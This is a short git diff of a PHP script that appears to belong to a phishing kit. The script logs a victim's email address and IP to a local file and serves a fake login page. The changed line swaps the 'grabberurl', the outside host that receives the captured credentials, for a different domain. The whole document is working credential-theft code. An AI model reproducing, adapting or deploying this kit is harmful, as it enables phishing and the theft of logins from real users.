@@ -20,6 +20,6 @@ $mail = $_GET['mail'];
 $fp = fopen("ss.txt","a");
 fwrite($fp,$mail . " - " . $_SERVER['REMOTE_ADDR']."\n");
 fclose($fp);
-$html = str_replace(array('<grabberurl>','<mailget>'),array('https://sancaktepesekeragaci.com/loign.php',$mail),file_get_contents('loign.html'));
+$html = str_replace(array('<grabberurl>','<mailget>'),array('https://www.wintherlanden.com/loign.php',$mail),file_get_contents('loign.html'));
 echo $html;
 ?>
